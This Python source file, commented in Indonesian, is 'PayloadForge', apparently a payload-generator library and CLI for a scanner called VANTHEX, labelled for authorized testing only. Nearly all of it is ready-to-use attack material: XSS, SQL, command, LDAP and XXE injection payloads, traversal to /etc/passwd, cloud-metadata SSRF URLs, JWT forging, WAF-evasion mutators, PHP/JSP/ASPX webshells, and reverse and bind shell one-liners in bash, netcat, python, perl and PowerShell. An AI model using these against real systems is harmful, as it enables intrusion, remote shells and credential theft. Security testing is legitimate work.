"""
PayloadForge v1 — pustaka generator payload untuk VANTHEX. AUTHORIZED TESTING ONLY.

Pustaka generator payload murni (tanpa jaringan, tanpa I/O file) — semua
fungsi mengembalikan struktur data sehingga mudah diuji unit dan dipakai
check engine maupun CLI. Payload dirancang untuk verifikasi non-destruktif:
tidak ada payload yang menulis/mengubah data target (tanpa DROP/UPDATE/DELETE,
tanpa penulisan filesystem); kelas shell disediakan sebagai teks generator
untuk engagement berotorisasi, bukan dijalankan otomatis oleh engine.

Placeholder {MK} pada template diganti marker per-scan/check (lihat
vulnscan2.Ctx.marker) agar temuan bisa dikaitkan ke scan pengirim.
"""
import argparse
import base64
import json as _json
import urllib.parse

MARKER_TOKEN = "PTKMK"


# ============================================================ encoder

def enc_url(s):
    return urllib.parse.quote(str(s), safe="")


def enc_double_url(s):
    return enc_url(enc_url(s))


def enc_html_entity(s):
    return "".join(
        c if c.isalnum() else f"&#{ord(c)};" for c in str(s))


def enc_unicode(s):
    return "".join(
        c if c.isalnum() else "".join(f"\\u{b:04x}" for b in c.encode("utf-8"))
        for c in str(s))


def enc_b64(s):
    return base64.b64encode(str(s).encode()).decode()


def enc_hex(s):
    return "".join(f"\\x{ord(c):02x}" for c in str(s))


def enc_json_str(s):
    return _json.dumps(str(s))


ENCODERS = {
    "url": enc_url,
    "double_url": enc_double_url,
    "html_entity": enc_html_entity,
    "unicode": enc_unicode,
    "base64": enc_b64,
    "hex": enc_hex,
    "json": enc_json_str,
}


def encode(payload, encoding):
    """Enkode payload dengan skema bernama; unknown -> ValueError."""
    if encoding not in ENCODERS:
        raise ValueError(f"encoder tidak dikenal: {encoding}")
    return ENCODERS[encoding](payload)


# ============================================================ mutator WAF-evasion

def _case_swap(s):
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def _comment_inject(s):
    """Sisipkan komentar inline ala MySQL pada kata kunci: sel<!--x-->ect."""
    out, words = [], ("select", "union", "sleep", "script", "alert", "onload")
    for w in s.split():
        lw = w.lower().strip("`'\"();,")
        if lw in words and len(w) > 2:
            mid = max(2, len(w) // 2)
            out.append(f"{w[:mid]}<!--x-->{w[mid:]}")
        else:
            out.append(w)
    return " ".join(out)


def _whitespace_variants(s):
    return [s.replace(" ", "\t"), s.replace(" ", "/**/"), s.replace(" ", "%09")]


def mutate(payload):
    """Varian evasion untuk satu payload (case, komentar, whitespace, urldouble).

    Tidak ada mutasi yang mengubah SEMANTIK payload — hanya bentuk. Dipakai
    untuk menyiasati WAF yang memblokir bentuk baku.
    """
    out = [payload, _case_swap(payload), _comment_inject(payload),
           enc_double_url(payload)]
    out.extend(_whitespace_variants(payload))
    # buang duplikat, jaga urutan
    seen, uniq = set(), []
    for v in out:
        if v and v not in seen:
            seen.add(v)
            uniq.append(v)
    return uniq


# ============================================================ mutator WAF-aware
def waf_variants(payload, blocked=()):
    """Varian mutasi WAF-aware: hasilkan mutasi, buang yang masih memuat
    pola terblokir, urutkan dari yang paling mungkin lolos (double-encoding
    dulu, lalu komentar, lalu case-swap). Semantik payload dipertahankan.

    Args:
        payload: payload baku.
        blocked: iterable substring pola yang diketahui WAF memblokir.

    Returns list varian siap-kirim (payload baku di depan bila lolos filter).
    """
    blocked = tuple(b.lower() for b in blocked)
    def still_blocked(v):
        lv = v.lower()
        return any(b in lv for b in blocked)
    variants = mutate(payload)
    # urutan preferensi: encoding ganda -> komentar -> whitespace -> case
    ordered = ([enc_double_url(payload), enc_double_url(enc_double_url(payload))]
               + variants[1:])
    out, seen = [], set()
    for v in ordered:
        if v and v not in seen and not still_blocked(v):
            seen.add(v)
            out.append(v)
    if not still_blocked(payload):
        out.insert(0, payload)
    return out


# ============================================================ XSS

_XSS_TEMPLATES = [
    ("<script>alert('{MK}')</script>", "html-body", "tag script klasik"),
    ("<img src=x onerror=alert('{MK}')>", "html-body", "event handler img"),
    ("<svg onload=alert('{MK}')>", "html-body", "svg onload"),
    ("<svg/onload=alert('{MK}')>", "html-body", "svg onload slash (filter slash-aware)"),
    ("<body onload=alert('{MK}')>", "html-body", "event handler body"),
    ("<iframe srcdoc=\"&lt;script&gt;alert('{MK}')&lt;/script&gt;\">", "html-body", "iframe srcdoc"),
    ("<details open ontoggle=alert('{MK}')>", "html-body", "details ontoggle (tanpa interaksi)"),
    ("<video><source onerror=alert('{MK}')>", "html-body", "video source onerror"),
    ("\"><svg onload=alert('{MK}')>", "attribute", "break-out atribut ber-quote ganda"),
    ("'><svg onload=alert('{MK}')>", "attribute", "break-out atribut ber-quote tunggal"),
    ("javascript:alert('{MK}')", "attribute", "href/src scheme injection"),
    ("</script><script>alert('{MK}')</script>", "js-block", "keluar dari blok script"),
    ("';alert('{MK}')//", "js-string", "break-out string JS satu baris"),
    ("';alert('{MK}')/*", "js-string", "break-out string JS buka komentar"),
    ("<math><mtext></form><form><mglyph><svg><mtext><style><path id='</style><alert('{MK}')>",
     "html-body", "mutation-XSS (mXSS) pola DOMPurify klasik"),
]

_XSS_EVENT_PAYLOAD = "<{tag} {event}=alert('{MK}')>"

XSS_TAGS = ("img", "svg", "video", "audio", "body", "details", "marquee", "input")
XSS_EVENTS = ("onerror", "onload", "ontoggle", "onfocus", "onmouseover", "onanimationstart")


def xss_vectors(marker=MARKER_TOKEN, context=None):
    """Vektor XSS ber-marker. context: html-body|attribute|js-block|js-string|None."""
    mk = str(marker)
    out = []
    for tpl, ctx_, note in _XSS_TEMPLATES:
        if context and ctx_ != context:
            continue
        out.append({"payload": tpl.replace("{MK}", mk),
                    "category": "xss", "context": ctx_, "note": note})
    for tag in XSS_TAGS:
        if context and context != "html-body":
            break  # event-handler semuanya html-body — hormati filter
        for ev in XSS_EVENTS:
            payload = _XSS_EVENT_PAYLOAD.replace("{tag}", tag).replace("{event}", ev)
            out.append({"payload": payload.replace("{MK}", mk),
                        "category": "xss", "context": "html-body",
                        "note": f"event-handler {tag}/{ev}"})
    return out


# ============================================================ SQLi

def sqli_boolean_pairs():
    """Pasangan boolean (true/false) independent per konteks — uji diferensial.

    Konfirmasi butuh KEDUA pasangan independent lolos + reproduksi (aturan
    kejujuran engine); satu pasangan = probable saja.
    """
    return [
        {"db": "generic", "context": "numeric",
         "benign": "1",
         "true": "1 AND 1=1", "false": "1 AND 1=2"},
        {"db": "generic", "context": "numeric",
         "benign": "1",
         "true": "1 AND 2>1", "false": "1 AND 2>3"},
        {"db": "generic", "context": "string",
         "benign": "a",
         "true": "a' AND 'a'='a", "false": "a' AND 'a'='b"},
        {"db": "generic", "context": "string",
         "benign": "a",
         "true": "a' AND 'b'>'a", "false": "a' AND 'b'<'a"},
    ]


def sqli_error_payloads():
    return [
        {"payload": "'", "db": "generic", "note": "kutip tunggal: pemicu error klasik"},
        {"payload": "1'", "db": "generic", "note": "kutip setelah angka"},
        {"payload": "1 OR 1=1", "db": "generic", "note": "tautologi numerik"},
        {"payload": "' OR '1'='1", "db": "generic", "note": "tautologi string"},
        {"payload": "1' ORDER BY 100-- -", "db": "mysql", "note": "probe jumlah kolom"},
        {"payload": "1 UNION SELECT NULL-- -", "db": "mysql", "note": "probe UNION"},
        {"payload": "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
         "db": "mysql", "note": "error-based EXTRACTVALUE (read-only)"},
        {"payload": "1 AND 1=CAST((SELECT version()) AS INT)-- -",
         "db": "postgres", "note": "error-based cast (read-only)"},
    ]


def sqli_time_payloads(delay=3):
    d = max(1, int(delay))
    return [
        {"payload": f"1 AND SLEEP({d})-- -", "db": "mysql", "delay": d},
        {"payload": f"1 AND SLEEP({d})", "db": "mysql", "delay": d},
        {"payload": f"1'; SELECT pg_sleep({d})-- -", "db": "postgres", "delay": d},
        {"payload": f"1' WAITFOR DELAY '0:0:{d}'-- -", "db": "mssql", "delay": d},
        {"payload": f"1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',{d})-- -",
         "db": "oracle", "delay": d},
        {"payload": f"1 AND RAND()*(SELECT 1 FROM (SELECT SLEEP({d}))x)-- -",
         "db": "mysql", "delay": d},
    ]


def sqli_union_payloads(columns=5, marker=MARKER_TOKEN):
    """Template UNION SELECT dengan filler NULL + posisi marker per kolom.

    Read-only: hanya SELECT literal — tidak ada akses tabel lain.
    """
    out = []
    for pos in range(columns):
        cols = ["NULL"] * columns
        cols[pos] = f"'{marker}'"
        out.append({"payload": f"' UNION SELECT {','.join(cols)}-- -",
                    "db": "generic", "columns": columns, "marker_pos": pos})
    return out


def sqli_payloads(delay=3, columns=5, marker=MARKER_TOKEN):
    out = []
    for grp in (sqli_error_payloads(), sqli_time_payloads(delay),):
        out.extend(grp)
    out.extend(sqli_union_payloads(columns, marker))
    return out


# ============================================================ command injection

def cmdi_echo(num_a, num_b):
    """Payload aritmetika POSIX/Windows — hasil unik per-scan (anti-FP)."""
    return [
        {"payload": f"false;echo $(({num_a}*{num_b}))", "shell": "posix",
         "expect": str(num_a * num_b), "control": str(num_a + num_b)},
        {"payload": f"`expr {num_a} \\* {num_b}`", "shell": "posix",
         "expect": str(num_a * num_b), "control": str(num_a + num_b)},
        {"payload": f"$(echo $(({num_a}*{num_b})))", "shell": "posix",
         "expect": str(num_a * num_b), "control": str(num_a + num_b)},
        {"payload": f"false%0aecho $(({num_a}*{num_b}))", "shell": "posix-crlf",
         "expect": str(num_a * num_b), "control": str(num_a + num_b)},
        {"payload": f"& set /a {num_a}*{num_b}", "shell": "windows",
         "expect": str(num_a * num_b), "control": str(num_a + num_b)},
    ]


def cmdi_delay(seconds=2):
    s = max(1, int(seconds))
    return [
        {"payload": f"false;sleep {s}", "shell": "posix", "delay": s},
        {"payload": f"`sleep {s}`", "shell": "posix", "delay": s},
        {"payload": f"$(sleep {s})", "shell": "posix", "delay": s},
        {"payload": f"false%0asleep {s}", "shell": "posix-crlf", "delay": s},
        {"payload": f"& ping -n {s + 1} 127.0.0.1", "shell": "windows", "delay": s},
    ]


def cmdi_payloads(num_a=7, num_b=3, seconds=2):
    return cmdi_echo(num_a, num_b) + cmdi_delay(seconds)


# ============================================================ SSTI

def ssti_probes():
    return [
        {"engine": "jinja2", "payload": "{{7*'7'}}", "expect": "7777777",
         "note": "pembeda jinja2 (7*str)"},
        {"engine": "jinja2/twig", "payload": "{{7*7}}", "expect": "49"},
        {"engine": "freemarker", "payload": "${7*7}", "expect": "49"},
        {"engine": "velocity", "payload": "#set($x=7*7)$x", "expect": "49"},
        {"engine": "mako", "payload": "${7*7}", "expect": "49"},
        {"engine": "erb", "payload": "<%= 7*7 %>", "expect": "49"},
        {"engine": "pebble", "payload": "{{7*7}}", "expect": "49"},
    ]


# ============================================================ path traversal

def traversal_payloads(depth=10):
    """Prefiks traversal dalam beragam encoding (fingerprint diperiksa check)."""
    plain = "../" * depth
    win = "..\\" * depth
    dotdot = "....//" * depth
    return [
        plain, win, dotdot,
        enc_url("../" * depth),          # ..%2F
        enc_double_url("../" * depth),
        "%c0%ae%c0%ae/" * depth,          # overlong UTF-8 (server lama)
        "..%c0%af" * depth,
        "/..%2f..%2f..%2fetc%2fpasswd",
    ]


def traversal_targets():
    return [
        {"file": "etc/passwd", "os": "posix",
         "fingerprint": r"root:[x*]?:0:0", "note": "passwd POSIX"},
        {"file": "etc/hosts", "os": "posix",
         "fingerprint": r"127\.0\.0\.1\s+localhost", "note": "hosts POSIX"},
        {"file": "windows/win.ini", "os": "windows",
         "fingerprint": r"\[(extensions|fonts)\]", "note": "win.ini"},
        {"file": "boot.ini", "os": "windows",
         "fingerprint": r"\[boot loader\]", "note": "boot.ini (XP lawas)"},
    ]


def traversal_suite(depth=10):
    """Kombinasi (payload-prefix x target) siap uji + fingerprint-nya."""
    out = []
    for pre in traversal_payloads(depth):
        for tgt in traversal_targets():
            joiner = "" if pre.endswith("/") else ("/" if "\\" not in tgt["file"] else "\\")
            out.append({"payload": f"{pre}{joiner}{tgt['file']}",
                        "fingerprint": tgt["fingerprint"], "os": tgt["os"],
                        "target": tgt["file"]})
    return out


# ============================================================ SSRF

def ssrf_targets():
    return [
        {"url": "http://169.254.169.254/latest/meta-data/", "kind": "aws-ec2",
         "fingerprint": r"ami-id|instance-id|iam/security-credentials"},
        {"url": "http://metadata.google.internal/computeMetadata/v1/",
         "kind": "gcp", "fingerprint": r"computeMetadata|instance/",
         "note": "butuh header Metadata-Flavor — check harus kirim sendiri"},
        {"url": "http://169.254.169.254/metadata/instance", "kind": "azure",
         "fingerprint": r"compute|vmId"},
        {"url": "http://100.100.100.200/latest/meta-data/", "kind": "alibaba",
         "fingerprint": r"instance-id"},
        {"url": "http://169.254.169.254/metadata/v1/", "kind": "digitalocean",
         "fingerprint": r"droplet|hostname"},
        {"url": "http://127.0.0.1:80/", "kind": "loopback", "fingerprint": r"."},
        {"url": "file:///etc/passwd", "kind": "file-scheme",
         "fingerprint": r"root:[x*]?:0:0",
         "note": "hanya relevan bila parser fetch menerima scheme file"},
    ]


# ============================================================ CRLF

def crlf_payloads(marker=MARKER_TOKEN):
    mk = str(marker)
    return [
        {"payload": f"%0d%0aX-Injected: {mk}", "note": "header injection CRLF"},
        {"payload": f"%0aX-Injected: {mk}", "note": "LF saja"},
        {"payload": f"%0d%0a%0d%0a<html>{mk}</html>", "note": "response splitting"},
        {"payload": f"%0d%0aSet-Cookie: ptk={mk};", "note": "cookie injection"},
        {"payload": f"%E5%98%8A%E5%98%8DX-Injected: {mk}",
         "note": "unicode CRLF (parser yang mengubah U+560A)"},
    ]


# ============================================================ JWT

def jwt_kid_payloads():
    return [
        {"payload": "../../dev/null", "note": "kid path traversal ke file kosong"},
        {"payload": "key:1 UNION SELECT 'x'", "note": "kid SQLi (perlu quote pasang DB)"},
        {"payload": "x|echo pwned", "note": "kid command injection (shell eval)"},
        {"payload": "../../../proc/self/environ", "note": "kid ke environ proses"},
    ]


def jwt_none_variants(header_b64, payload_b64):
    """Varian token dengan alg=none (3 bentuk: tanpa ttd, kosong, mati dgn titik)."""
    import base64 as _b
    h = header_b64.rstrip("=")
    p = payload_b64.rstrip("=")
    none_b64 = _b.urlsafe_b64encode(b'{"alg":"none"}').decode().rstrip("=")
    return [f"{none_b64}.{p}.", f"{none_b64}.{p}", f"{h}.{p}."]


def jwt_forge_hs256(header_b64, payload_b64, key):
    """Forge HMAC-SHA256 (stdlib) — untuk uji key-confusion saat key diketahui."""
    import base64 as _b
    import hashlib
    import hmac as _hm
    h = header_b64.rstrip("=")
    p = payload_b64.rstrip("=")
    sig = _b.urlsafe_b64encode(
        _hm.new(str(key).encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    ).decode().rstrip("=")
    return f"{h}.{p}.{sig}"


# ============================================================ shell generator

def reverse_shells(host, port):
    """Satu-liner reverse shell untuk engagement berotorisasi (teks, tak dijalankan)."""
    h, p = str(host), int(port)
    py = (f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
          f"s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
          f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
    return [
        {"name": "bash-tcp", "shell": "bash",
         "command": f"bash -i >& /dev/tcp/{h}/{p} 0>&1",
         "listener": f"nc -lvnp {p}"},
        {"name": "nc-e", "shell": "netcat",
         "command": f"nc -e /bin/sh {h} {p}",
         "listener": f"nc -lvnp {p}"},
        {"name": "nc-mkfifo", "shell": "netcat",
         "command": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {h} {p} >/tmp/f",
         "listener": f"nc -lvnp {p}"},
        {"name": "python", "shell": "python", "command": py,
         "listener": f"nc -lvnp {p}"},
        {"name": "perl", "shell": "perl",
         "command": (f"perl -e 'use Socket;$i=\"{h}\";$p={p};"
                     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                     "connect(S,sockaddr_in($p,inet_aton($i)));"
                     "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                     "exec(\"/bin/sh -i\");'"),
         "listener": f"nc -lvnp {p}"},
        {"name": "powershell", "shell": "powershell",
         "command": (f"powershell -nop -c \"$client = New-Object System.Net.Sockets."
                     f"TCPClient('{h}',{p});$stream = $client.GetStream();"
                     "[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,"
                     "$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text."
                     "ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | "
                     "Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte="
                     "([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write("
                     "$sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""),
         "listener": f"nc -lvnp {p}"},
    ]


def bind_shells(port):
    p = int(port)
    return [
        {"name": "nc-bind", "shell": "netcat",
         "command": f"nc -lvnp {p} -e /bin/sh",
         "connect": f"nc <target> {p}"},
        {"name": "python-bind", "shell": "python",
         "command": (f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
                     f"s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
                     f"s.bind((\"0.0.0.0\",{p}));s.listen(1);c,a=s.accept();"
                     "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
                     "subprocess.call([\"/bin/sh\",\"-i\"])'"),
         "connect": f"nc <target> {p}"},
    ]


# ============================================================ XXE
def xxe_payloads(marker=MARKER_TOKEN):
    """XXE read-only (baca file / SSRF via DTD) — tanpa penulisan file."""
    mk = str(marker)
    return [
        {"payload": ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
                     f'"file:///etc/passwd">]><r>&x;</r>'),
         "system": "xml", "note": "entity file passthrough",
         "fingerprint": r"root:[x*]?:0:0"},
        {"payload": ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
                     '"http://169.254.169.254/latest/meta-data/">]><r>&x;</r>'),
         "system": "xml", "note": "SSRF via entity extern",
         "fingerprint": r"ami-id|instance-id", "kind": "ssrf"},
        {"payload": ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % f SYSTEM '
                     '"file:///etc/passwd"><!ENTITY % t "<!ENTITY x '
                     '&#37;f;">">%t;]><r>&x;</r>'),
         "system": "xml", "note": "parameter entity ln (tanpa OOB)"},
        {"payload": ('<?xml version="1.0" encoding="UTF-8"?>'
                     '<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/'
                     'convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>'),
         "system": "php", "note": "php://filter (b64), untuk backend PHP",
         "encode": "base64"},
    ]


# ============================================================ LFI wrapper
def lfi_wrappers(marker=MARKER_TOKEN):
    doi = "data://text/plain;base64," + \
          __import__("base64").b64encode(b"<?php echo 'VX'+'WAF'; ?>").decode()
    return [
        {"payload": "php://filter/convert.base64-encode/resource=%s",
         "note": "php filter b64 (ganti %s dgn file)", "kind": "read"},
        {"payload": f"data://text/plain;base64,{doi}",
         "note": "data:// wrapper (bisa RCE di include PHP)", "kind": "data"},
        {"payload": "php://input", "note": "php://input (body didorong include)", "kind": "input"},
        {"payload": "phar:///tmp/shell.phar", "note": "phar deserialization (gadget)", "kind": "phar"},
        {"payload": "expect://id", "note": "expect:// RCE (jika modul terpasang)", "kind": "rce"},
    ]


# ============================================================ webshell
def webshell_payloads(marker=MARKER_TOKEN):
    mk = str(marker)
    return [
        {"payload": "<?php system($_GET['c']); ?>", "lang": "php",
         "use": "<?php system($_GET['c']);?>", "note": "PHP RCE minimal"},
        {"payload": "<?php @eval($_POST['c']);?>", "lang": "php",
         "note": "PHP eval one-liner (jangan untuk prod)"},
        {"payload": "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>",
         "lang": "jsp", "note": "JSP command exec"},
        {"payload": "<%= System.getenv() %>", "lang": "jsp", "note": "JSP env dump"},
        {"payload": "<%% if 1=1 %%><%%@ Page Language=\"C#\" %%><% Process p=Process.Start(\"cmd\",\"/c \"+Request[\"c\"]); %>",
         "lang": "aspx", "note": "ASPX command exec"},
        {"payload": "require('child_process').execSync(req.query.c)", "lang": "node",
         "note": "Node RCE (di endpoint yang evaluate)"},
    ]


# ============================================================ NoSQL (Mongo)
def nosql_payloads():
    """NoSQL injection (Mongo) — operator $gt/$ne/$where, read-only."""
    return [
        {"payload": {"username": {"$gt": ""}, "password": {"$gt": ""}},
         "note": "operator $gt bypass", "kind": "auth-bypass"},
        {"payload": {"username": {"$ne": "zzz"}, "password": {"$ne": "zzz"}},
         "note": "operator $ne", "kind": "auth-bypass"},
        {"payload": {"$where": "1" == "1"}, "note": "$where JS (RCE bila enabled)", "kind": "rce"},
        {"payload": {"username": "admin", "password": {"$regex": ".*"}},
         "note": "$regex wildcard", "kind": "auth-bypass"},
        {"payload": {"username": {"$in": ["admin", "root"]}},
         "note": "$in", "kind": "enum"},
    ]


# ============================================================ LDAP
def ldap_payloads():
    return [
        {"payload": "*", "note": "wildcard -> semua entri", "kind": "blind"},
        {"payload": "*)(&", "note": "break-out filter -> bad filter", "kind": "error"},
        {"payload": "*))(|(uid=*", "note": "OR chain", "kind": "boolean"},
        {"payload": "admin)(|(password=*", "note": "bypass auth", "kind": "auth-bypass"},
        {"payload": "*)(uid=*", "note": "AND chain wildcard", "kind": "boolean"},
    ]


# ============================================================ XPath
def xpath_payloads():
    return [
        {"payload": "' or '1'='1", "note": "tautologi string", "kind": "boolean"},
        {"payload": "x' or 1=1 or 'x'='y", "note": "tautologi numerik", "kind": "boolean"},
        {"payload": "' or count(/*)>0 or '", "note": "probe dokumen", "kind": "boolean"},
        {"payload": "'", "note": "kutip -> error XPath", "kind": "error"},
        {"payload": "'] | //* | //*[", "note": "union node", "kind": "extract"},
    ]


# ============================================================ SMTP header injection
def smtp_payloads(marker=MARKER_TOKEN):
    mk = str(marker)
    return [
        {"payload": f"test@x.com\r\nBcc: {mk}@x.com", "note": "BCC injection (CC leak)"},
        {"payload": "a\\r\\nb\\r\\n.\r\\r\\nQUIT", "note": "SMTP command injection"},
        {"payload": f"%0d%0aTo:{mk}@x.com%0d%0a", "note": "header injection URL-encoded"},
    ]


# ============================================================ deserialization
def deser_payloads(marker=MARKER_TOKEN):
    mk = str(marker)
    return [
        {"payload": "O:1:\"A\":0:{}", "note": "PHP object stub (probe)"},
        {"payload": "a:1:{i:0;s:4:\"test\";}", "note": "PHP serialized array"},
        {"payload": "rO0ABXQAAw==", "note": "Java serialization magic (aced0005 -> base64)",
         "magic": "aced0005"},
        {"payload": "O:8:\"X\":1:{s:1:\"x\";O:1:\"Y\":0:{}}", "note": "PHP nested object (gadget)"},
        {"payload": "{\"__proto__\":{\"polluted\":\"yes\"}}", "note": "JS prototype pollution (JSON)"},
        {"payload": "_TZFEELmYgAUBodHlwZXh0", "note": "python pickle opcode probe (cos)",
         "kind": "pickle"},
    ]


# ============================================================ dispatcher

CATEGORIES = {
    "xss": xss_vectors,
    "sqli": sqli_payloads,
    "sqli_boolean": sqli_boolean_pairs,
    "sqli_error": sqli_error_payloads,
    "sqli_time": sqli_time_payloads,
    "sqli_union": sqli_union_payloads,
    "cmdi": cmdi_payloads,
    "ssti": ssti_probes,
    "traversal": traversal_suite,
    "ssrf": ssrf_targets,
    "crlf": crlf_payloads,
    "jwt": jwt_kid_payloads,
    "xxe": xxe_payloads,
    "lfi": lfi_wrappers,
    "webshell": webshell_payloads,
    "nosql": nosql_payloads,
    "ldap": ldap_payloads,
    "xpath": xpath_payloads,
    "smtp": smtp_payloads,
    "deser": deser_payloads,
    "reverse_shells": reverse_shells,
    "bind_shells": bind_shells,
}


def generate(category, **kwargs):
    """Generator seragam per kategori. Unknown category -> ValueError."""
    if category not in CATEGORIES:
        raise ValueError(f"kategori tidak dikenal: {category} "
                         f"(sah: {', '.join(sorted(CATEGORIES))})")
    return CATEGORIES[category](**kwargs)


def list_categories():
    return sorted(CATEGORIES)


# ============================================================ CLI kecil

def _main():
    ap = argparse.ArgumentParser(
        prog="payloadforge",
        description="PayloadForge — generator payload VANTHEX (AUTHORIZED TESTING ONLY)")
    ap.add_argument("category", help=" ".join(list_categories()) + " | list")
    ap.add_argument("--marker", default=MARKER_TOKEN)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=4444)
    ap.add_argument("--delay", type=int, default=3)
    ap.add_argument("--columns", type=int, default=5)
    ap.add_argument("--encode", default=None, choices=sorted(ENCODERS))
    ap.add_argument("--mutate", action="store_true")
    ap.add_argument("--limit", type=int, default=None)
    args = ap.parse_args()

    if args.category == "list":
        print("\n".join(list_categories()))
        return
    kw = {}
    if args.category == "xss":
        kw["marker"] = args.marker
    elif args.category == "sqli":
        kw.update(delay=args.delay, columns=args.columns, marker=args.marker)
    elif args.category == "sqli_time":
        kw["delay"] = args.delay
    elif args.category == "sqli_union":
        kw.update(columns=args.columns, marker=args.marker)
    elif args.category == "cmdi":
        kw.update(num_a=7, num_b=3)
    elif args.category in ("crlf",):
        kw["marker"] = args.marker
    elif args.category in ("reverse_shells",):
        kw.update(host=args.host, port=args.port)
    elif args.category in ("bind_shells",):
        kw.update(port=args.port)
    items = generate(args.category, **kw)
    # normalisasi bentuk: beberapa generator balik dict murni tanpa "payload"
    norm = []
    for it in items:
        if isinstance(it, dict):
            if "payload" in it or "command" in it or "url" in it or "true" in it:
                norm.append(it)
        else:
            norm.append({"payload": it})
    if args.limit:
        norm = norm[:args.limit]
    for it in norm:
        value = it.get("payload") or it.get("command") or it.get("url") \
            or f"{it.get('true')} <-> {it.get('false')}"
        if args.encode and "payload" in it:
            value = encode(value, args.encode)
        variants = mutate(value) if args.mutate else [value]
        for v in variants:
            print(v)


if __name__ == "__main__":
    _main()
